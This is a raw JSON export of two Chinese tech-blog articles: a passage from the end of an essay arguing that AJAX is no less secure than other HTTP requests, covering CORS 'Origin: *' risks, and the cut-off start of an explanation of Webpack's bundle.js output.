class=\"hljs-number\"\u003e1.\u003c/span\u003e 有一个接口，接收AJAX post的数据\n\n\u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003e 数据中有一个字段 \u003cspan class=\"hljs-string\"\u003e'name'\u003c/span\u003e，后台接收到后没有进行过滤，直接如上面的演示一样，执行sql语句了\n\n\u003cspan class=\"hljs-number\"\u003e3.\u003c/span\u003e 所以AJAX中如果给那个字段传入非法的注入信息，就会触发这个漏洞，导致攻击生效\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e对，就是这样极端的情况下才会发生，而且与AJAX并没有关系，\u003cstrong\u003e因为换成任何一种其它请求都会有类似的情况\u003c/strong\u003e。。。\u003c/p\u003e\n\u003cp\u003e所以说，结论是：\u003cstrong\u003eSQL注入与AJAX无关\u003c/strong\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eAJAX和HTTP请求的区别\u003c/h2\u003e\n\u003cp\u003e从本质上将：\u003cstrong\u003eAJAX就是浏览器发出的HTTP请求\u003c/strong\u003e，只不过是浏览器加上了一个同源策略限制而已。\u003c/p\u003e\n\u003cp\u003eAJAX请求的\u003ccode\u003eXMLHTTPRequest\u003c/code\u003e对象就是浏览器开放给JS调用HTTP请求用的。\u003c/p\u003e\n\u003cp\u003e那么AJAX和HTTP的区别呢？列出以下几点：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eAJAX请求受到浏览器的同源策略限制，存在跨域问题\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eAJAX在进行复杂请求时，浏览器会预先发出\u003ccode\u003eOPTIONS\u003c/code\u003e预检（HTTP自己是不会预检的）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e从使用角度上说，AJAX使用简单一点，少了些底层细节，多了些浏览器特性（如自动带上同域cookie等）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e所以说，和认证上的HTTP请求的区别就是-多了一次浏览器的封装而已（浏览器会有自己的预处理，加上特定限制）\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e但是，从最终发出的报文来看，内容都是一样的（HTTP协议规范的内容），\u003cstrong\u003eAJAX是发送HTTP请求的一种方式\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e所以从这一点可以得出一个结论：\u003cstrong\u003eAJAX本质上安全性和HTTP请求一样\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160be99c3d440284?w=565\u0026amp;h=493\u0026amp;f=png\u0026amp;s=12366\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eCORS与AJAX安全性之间的关联\u003c/h2\u003e\n\u003cp\u003e按照前文中提到的内容，基本无法得出AJAX与请求不安全的关联。那么接下来，再继续分析，如果使用了跨域资源共享（CORS）后的安全性。\n(因为往往ajax都会伴随着CORS)\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eCORS与AJAX关系的简介\u003c/h3\u003e\n\u003cp\u003e这是一个跨域共享方案，大致流程就是：（仅以复杂请求的预检举例-这一部分要求提前掌握CORS相关知识）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003e 前端AJAX请求前发出一个OPTIONS预检，会带一堆相关头部发送给服务端\n\n\u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003e 服务端在接受到预检时，检查头部，来源等信息是否合法，合法则接下来允许正常的请求，\n否则直接无情的拒绝掉\n\n\u003cspan class=\"hljs-number\"\u003e3.\u003c/span\u003e 浏览器端如果收到服务端拒绝的信息（响应头部检查），就抛出对应错误。\n否则就是正常的响应，接下来发出真正的请求（如POST）\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e请求和响应的头部信息大概如下：\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eRequest Headers\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 在CORS中专门作为Origin信息供后端比对，表示来源域。\u003c/span\u003e\nOrigin: http:\u003cspan class=\"hljs-comment\"\u003e//xxx\u003c/span\u003e\nAccess-Control-Request-Headers: X-Requested-With\n\u003cspan class=\"hljs-comment\"\u003e// 所有用setRequestHeader方法设置的头部都将会以逗号隔开的形式包含在这个头中，一般POST请求中就会带上\u003c/span\u003e\nAccess-Control-Request-Method: OPTIONS\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003eResponse Headers\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eAccess-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Origin: http:\u003cspan class=\"hljs-comment\"\u003e//xxx\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最终，客户端发出的请求，必须符合服务端的校验规则才能正确，服务端才会返回正确头部，否则只会请求失败。报跨域错误。\u003c/p\u003e\n\u003cp\u003e以上仅是简介，更多信息可以参考来源中的\u003ccode\u003eajax跨域，这应该是最全的解决方案了\u003c/code\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e为什么要配置CORS？\u003c/h3\u003e\n\u003cp\u003e因为同源策略限制，AJAX无法请求跨域资源，CORS可以解决AJAX跨域请求问题。\u003c/p\u003e\n\u003cp\u003e因此：\u003cstrong\u003e在本文中，配置CORS只是为了AJAX能跨域请求\u003c/strong\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eCORS会配置些什么信息？\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eAccess-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Origin: http:\u003cspan class=\"hljs-comment\"\u003e//xxx\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e如上，加上这个配置后，必须符合要求的才算是正常的请求，否则就会拒绝掉，一般AJAX跨域的话都会有OPTIONS，所以在预检中就做了这一步。\u003c/p\u003e\n\u003cp\u003e可以看到，关键的可变信息是：\u003ccode\u003eAccess-Control-Allow-Origin: http://xxx\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e这个配置就是域名白名单，规定在什么样的域名下才能进行AJAX跨域请求。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003eCORS \u003ccode\u003eOrigin: *\u003c/code\u003e的安全性\u003c/h3\u003e\n\u003cp\u003e关键问题来了，在上面的CORS配置是这样的：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eAccess-Control-Allow-Origin: http:\u003cspan class=\"hljs-comment\"\u003e//xxx\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e但是这个配置只允许特定域名访问，鉴于前端的复杂性，有时候调试起来不是很方便，因此有时候，会偷懒的设置为：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003eAccess-Control-Allow-Origin: *\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这个代表所有来源的跨域AJAX请求都能正常响应。\u003c/p\u003e\n\u003cp\u003e接下来我们再来分析设置\u003ccode\u003eOrigin: *\u003c/code\u003e可能带来哪些问题。（都是基于AJAX的情况）\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e问题1：会对cookie认证造成影响么？\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e不会。虽然\u003ccode\u003e*\u003c/code\u003e代表了所有来源都能正常请求，但是同源策略下，是无法带上跨域cookie的。因此根本无法用身份验证。\u003c/p\u003e\n\u003cp\u003e而且，就算用\u003ccode\u003ewithCredentials\u003c/code\u003e强行带上跨域cookie，因为后台没有支持，所以会报错。（这可以看成是CORSs模型的最后一道防线）\u003c/p\u003e\n\u003cp\u003e再者，后台就算配置\u003ccode\u003eAccess-Control-Allow-Credentials\u003c/code\u003e允许跨域cookie，但是这时候的安全策略是\u003ccode\u003eOrigin\u003c/code\u003e不允许为*，必须是一个明确的地址。\n（否则你就可以看到浏览器的报错信息-跨域cookie时，Origin不允许为*）\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e问题2：如果伪造Origin头部呢？\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e首先，标准的浏览器中是不允许你伪造的（除非有严重漏洞），所以一般需要通过模拟客户端请求伪造。\u003c/p\u003e\n\u003cp\u003e但是。在非浏览器情况下，本来就没有同源策略。这又是何必。。。\u003c/p\u003e\n\u003cp\u003e所以说，伪造Origin与CORS并没有关系。\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e问题3：如果后台本来就存在漏洞呢？\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e做这样一个假设，假设用户所在网络的内网中有一台内网服务器，并且配置了允许所有的跨域请求：（当然，外网是请求不到内网的）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 允许任何来自任意域的跨域请求\u003c/span\u003e\nAccess-Control-Allow-Origin: *\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e再假设内网服务器上恰巧存在敏感资源，并且没有额外设防，只要内网就能访问。譬如：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.23\u003c/span\u003e/users.md\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后用户访问了恶意网页，而像HTML之类的网页都是下载到本地执行的，\n正好网页内有恶意代码，去向\u003ccode\u003e192.168.111.23/users.md\u003c/code\u003e请求资源，再将接收到的服务端返回发送到攻击者服务器。\n（因为加了Origin为*，而且AJAX是由本地浏览器发出的，所以用户下载到本地的恶意网站是可以访问到用户内网中的后台的）\u003c/p\u003e\n\u003cp\u003e然后这些敏感数据就这样被盗取了。\u003c/p\u003e\n\u003cp\u003eBut，这是因为服务端漏洞而存在的问题，设置Origin为\u003cem\u003e的后台上为何要放置敏感资源？正常设置为Origin为\u003c/em\u003e的最大作用是用作公共API。\n而且更重要的是，为何敏感资源就这样轻易的被获取了？为什么没有二次验证？\u003c/p\u003e\n\u003cp\u003eSO，后台本身有漏洞，所以才导致被攻击，AJAX恰好是攻击的手段之一（除了AJAX外还会有其它的方式），所以很多锅都甩到了AJAX头上。\u003c/p\u003e\n\u003cp\u003e这样，可以得出一个保守点的结论：\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eOrigin如果不是\u003ccode\u003e*\u003c/code\u003e，AJAX请求并不会有安全问题，如果是\u003ccode\u003e*\u003c/code\u003e，可能会由于后台的漏洞，不经意间，AJAX就被作为一种攻击手段了，导致了出现AJAX不安全的说法\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160be99cab36918d?w=880\u0026amp;h=476\u0026amp;f=png\u0026amp;s=25763\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e再看，AJAX请求真的不安全么？\u003c/h2\u003e\n\u003cp\u003e仍然是最初的结论：\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e如果某个Web应用具备良好的安全性，那么再怎么用“不安全的AJAX”也削弱不了它的安全性，反之如果应用本身存在漏洞，不管用何种技术请求，它都是不安全的\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e我们可以看到，XSS也好，CSRF也好，以及其它隐藏的可能漏洞也好，本质上都是后台已有漏洞造成的问题，AJAX最多是被用作一种攻击手段（甚至某些里面AJAX还无法使用）\u003c/p\u003e\n\u003cp\u003e提到AJAX请求不安全的，譬如有CORS里面配置\u003ccode\u003eOrigin: *\u003c/code\u003e造成某些极端情况下能通过AJAX发出攻击。但事实上这也是其中的一种攻击手段而已，没有AJAX，该不安全的仍然不安全。\u003c/p\u003e\n\u003cp\u003e譬如还有的说法是：因为在AJAX出现以前，如果出现安全漏洞，容易被察觉，但AJAX是异步的，更容易隐式的出现安全问题。。。这也与安全性的本质无关。\u003c/p\u003e\n\u003cp\u003e最重要一点，从Web应用安全角度来谈，Web应用必须从不信任客户端。所以不要再把锅甩给AJAX。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eAJAX请求哪里不安全？\u003c/h2\u003e\n\u003cp\u003e同上，AJAX本身并不存在这种安全问题。\u003c/p\u003e\n\u003cp\u003e不过有一点需注意，如果使用了CORS方案。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003e Allow-Origin可以设置特定的值，过滤特定的白名单\n\n\u003cspan class=\"hljs-number\"\u003e2.\u003c/span\u003e 对于一些公共的API，可以直接将Allow-Origin设置为\u003cspan class=\"hljs-string\"\u003e`*`\u003c/span\u003e\n\n\u003cspan class=\"hljs-number\"\u003e3.\u003c/span\u003e 当然，如果确认后台没有这些隐藏漏洞，可以直接使用\u003cspan class=\"hljs-string\"\u003e`*`\u003c/span\u003e，毕竟也只是针对浏览器的同源策略而已，影响没有那么大。\n\u003c/code\u003e\u003c/pre\u003e\u003ch2 class=\"heading\"\u003e怎么样让AJAX请求更安全？\u003c/h2\u003e\n\u003cp\u003e仍然是文中反复提到的结论：\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e让Web后台更安全，则AJAX请求也更安全，反之后台有漏洞，不管怎么样都是不安全的\u003c/strong\u003e\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e写在最后的话\u003c/h2\u003e\n\u003cp\u003e这样的话，应该可以把AJAX不安全的锅甩掉了吧？\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e附录\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e参考资料\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0\"\u003e跨站请求伪造\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC\"\u003e跨站脚本\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html\"\u003e浅谈CSRF攻击方式\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://blog.csdn.net/ghsau/article/details/17027893\"\u003eXSS攻击及防御\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://www.cnblogs.com/lovesong/p/5199623.html\"\u003e前端安全之XSS攻击\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://blog.csdn.net/wei00d6ra/article/details/39137849\"\u003eAJAX真的不安全？\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://segmentfault.com/q/1010000002500378/a-1020000002502912\"\u003eAJAX 如何保证数据的安全性？\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://blog.csdn.net/fengyinchao/article/details/50775121\"\u003eWeb 开发常见安全问题\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://blog.csdn.net/fengyinchao/article/details/50775121\"\u003e跨域资源共享(CORS)安全性浅析\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://segmentfault.com/a/1190000012469713?_ea=3085755\"\u003eajax跨域，这应该是最全的解决方案了\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n","buildTime":"1515067135.4832","__v":0}
{"_id":{"$oid":"5a4e181827fe912a1025ce84"},"id":"5a4ccce0f265da432b4b3801","author":{"$oid":"5a4b76d92239bd131cd79f36"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/20/1607259d52144ee4?w=1348\u0026h=845\u0026f=jpeg\u0026s=183464"],"screenShot":null}],"title":"Webpack原理-输出文件分析","meta":{"likeCount":0},"tag":["Webpack"],"comment":[],"shortContent":"本节将解释清楚以上问题。 bundle.js 能直接运行在浏览器中的原因在于输出的文件中通过 __webpack_require__ 函数定义了一个可以在浏览器中执行的加载函数来模拟 Node.js 中的 require 语句。 原来一个个独立的模块文件被合并到了一个单独的 b…","content":"\u003cp\u003e虽然在前面的章节中你学会了如何使用 Webpack ，也大致知道其工作原理，可是你想过 Webpack 输出的 \u003ccode\u003ebundle.js\u003c/code\u003e 是什么样子的吗？\n为什么原来一个个的模块文件被合并成了一个单独的文件？为什么 \u003ccode\u003ebundle.js\u003c/code\u003e 能直接运行在浏览器中？\n本节将解释清楚以上问题。\u003c/p\u003e\n\u003cp\u003e先来看看由 \u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/1%E5%85%A5%E9%97%A8/1-3%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8.html\"\u003e1-3安装与使用\u003c/a\u003e 中最简单的项目构建出的 \u003ccode\u003ebundle.js\u003c/code\u003e 文件内容，代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e(\n    \u003cspan class=\"hljs-comment\"\u003e// webpackBootstrap 启动函数\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// modules 即为存放所有模块的数组，数组中的每一个元素都是一个函数\u003c/span\u003e\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003emodules\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-comment\"\u003e// 安装过的模块都存放在这里面\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e// 作用是把已经加载过的模块缓存在内存中，提升性能\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e installedModules = {};\n\n        \u003cspan class=\"hljs-comment\"\u003e// 去数组中加载一个模块，moduleId 为要加载模块在数组中的 index\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e// 作用和 Node.js 中 require 语句相似\u003c/span\u003e\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003e__webpack_require__\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003emoduleId\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-comment\"\u003e// 如果需要加载的模块已经被加载过，就直接从内存缓存中返回\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (installedModules[moduleId]) {\n                \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e installedModules[moduleId].exports;\n            }\n\n            \u003cspan class=\"hljs-comment\"\u003e// 如果缓存中不存在需要加载的模块，就新建一个模块，并把它存在缓存中\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e = installedModules[moduleId] = {\n                \u003cspan class=\"hljs-comment\"\u003e// 模块在数组中的 index\u003c/span\u003e\n                i: moduleId,\n                \u003cspan class=\"hljs-comment\"\u003e// 该模块是否已经加载完毕\u003c/span\u003e\n                l: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n                \u003cspan class=\"hljs-comment\"\u003e// 该模块的导出值\u003c/span\u003e\n                exports: {}\n            };\n\n            \u003cspan class=\"hljs-comment\"\u003e// 从 modules 中获取 index 为 moduleId 的模块对应的函数\u003c/span\u003e\n            \u003cspan class=\"hljs-comment\"\u003e// 再调用这个函数，同时把函数需要的参数传入\u003c/span\u003e\n            modules[moduleId].call(\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports, \u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e, \u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports, __webpack_require__);\n            \u003cspan class=\"hljs-comment\"\u003e// 把这个模块标记为已加载\u003c/span\u003e\n            \u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.l = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n            \u003cspan class=\"hljs-comment\"\u003e// 返回这个模块的导出值\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports;\n        }\n\n        \u003cspan class=\"hljs-comment\"\u003e// Webpack 配置中的 publicPath，用于加载被分割出去的异步代码\u003c/span\u003e\n        __webpack_require__.p = \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e;\n\n        \u003cspan class=\"hljs-comment\"\u003e// 使用 __webpack_require__ 去加载 index 为 0 的模块，并且返回该模块导出的内容\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e// index 为 0 的模块就是 main.js 对应的文件，也就是执行入口模块\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e// __webpack_require__.s 的含义是启动模块对应的 index\u003c/span\u003e\n        \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e __webpack_require__(__webpack_require__.s = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n\n    })(\n\n    \u003cspan class=\"hljs-comment\"\u003e// 所有的模块都存放在了一个数组里，根据每个模块在数组的 index 来区分和定位模块\u003c/span\u003e\n    [\n        \u003cspan class=\"hljs-comment\"\u003e/* 0 */\u003c/span\u003e\n        (\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003emodule, exports, __webpack_require__\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-comment\"\u003e// 通过 __webpack_require__ 规范导入 show 函数，show.js 对应的模块 index 为 1\u003c/span\u003e\n            \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e show = __webpack_require__(\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e);\n            \u003cspan class=\"hljs-comment\"\u003e// 执行 show 函数\u003c/span\u003e\n            show(\u003cspan class=\"hljs-string\"\u003e'Webpack'\u003c/span\u003e);\n        }),\n        \u003cspan class=\"hljs-comment\"\u003e/* 1 */\u003c/span\u003e\n        (\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003emodule, exports\u003c/span\u003e) \u003c/span\u003e{\n            \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eshow\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003econtent\u003c/span\u003e) \u003c/span\u003e{\n                \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.document.getElementById(\u003cspan class=\"hljs-string\"\u003e'app'\u003c/span\u003e).innerText = \u003cspan class=\"hljs-string\"\u003e'Hello,'\u003c/span\u003e + content;\n            }\n            \u003cspan class=\"hljs-comment\"\u003e// 通过 CommonJS 规范导出 show 函数\u003c/span\u003e\n            \u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = show;\n        })\n    ]\n);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e以上看上去复杂的代码其实是一个立即执行函数，可以简写为如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003emodules\u003c/span\u003e) \u003c/span\u003e{\n  \n  \u003cspan class=\"hljs-comment\"\u003e// 模拟 require 语句\u003c/span\u003e\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003e__webpack_require__\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n  }\n  \n  \u003cspan class=\"hljs-comment\"\u003e// 执行存放所有模块数组中的第0个模块\u003c/span\u003e\n  __webpack_require__(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n  \n})([\u003cspan class=\"hljs-comment\"\u003e/*存放所有模块的数组*/\u003c/span\u003e])\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003ebundle.js\u003c/code\u003e 能直接运行在浏览器中的原因在于输出的文件中通过 \u003ccode\u003e__webpack_require__\u003c/code\u003e 函数定义了一个可以在浏览器中执行的加载函数来模拟 Node.js 中的 \u003ccode\u003erequire\u003c/code\u003e 语句。\u003c/p\u003e\n\u003cp\u003e原来一个个独立的模块文件被合并到了一个单独的 \u003ccode\u003ebundle.js\u003c/code\u003e 的原因在于浏览器不能像 Node.js 那样快速地去本地加载一个个模块文件，而必须通过网络请求去加载还未得到的文件。\n如果模块数量很多，加载时间会很长，因此把所有模块都存放在了数组中，执行一次网络加载。\u003c/p\u003e\n\u003cp\u003e如果仔细分析 \u003ccode\u003e__webpack_require__\u003c/code\u003e 函数的实现，你还有发现 Webpack 做了缓存优化：\n执行加载过的模块不会再执行第二次，执行结果会缓存在内存中，当某个模块第二次被访问时会直接去内存中读取被缓存的返回值。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e分割代码时的输出\u003c/h2\u003e\n\u003cp\u003e在采用了 \u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/4%E4%BC%98%E5%8C%96/4-12%E6%8C%89%E9%9C%80%E5%8A%A0%E8%BD%BD.html\"\u003e4-12 按需加载\u003c/a\u003e 中介绍过的优化方法时，Webpack 的输出文件会发生变化。\u003c/p\u003e\n\u003cp\u003e例如把源码中的 \u003ccode\u003emain.js\u003c/code\u003e 修改为如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 异步加载 show.js\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'./show'\u003c/span\u003e).then(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eshow\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n  \u003cspan class=\"hljs-comment\"\u003e// 执行 show 函数\u003c/span\u003e\n  show(\u003cspan class=\"hljs-string\"\u003e'Webpack'\u003c/span\u003e);\n});\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e重新构建后会输出两个文件，分别是执行入口文件 \u003ccode\u003ebundle.js\u003c/code\u003e 和 异步加载文件 \u003ccode\u003e0.bundle.js\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e其中 \u003ccode\u003e0.bundle.js\u003c/code\u003e 内容如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 加载在本文件(0.bundle.js)中包含的模块\u003c/span\u003e\nwebpackJsonp(\n  \u003cspan class=\"hljs-comment\"\u003e// 在其它文件中存放着的模块的 ID\u003c/span\u003e\n  [\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e],\n  \u003cspan class=\"hljs-comment\"\u003e// 本文件所包含的模块\u003c/span\u003e\n  [\n    \u003cspan class=\"hljs-comment\"\u003e// show.js 所对应的模块\u003c/span\u003e\n    (\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003emodule, exports\u003c/span\u003e) \u003c/span\u003e{\n      \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eshow\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003econtent\u003c/span\u003e) \u003c/span\u003e{\n        \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e.document.getElementById(\u003cspan class=\"hljs-string\"\u003e'app'\u003c/span\u003e).innerText = \u003cspan class=\"hljs-string\"\u003e'Hello,'\u003c/span\u003e + content;\n      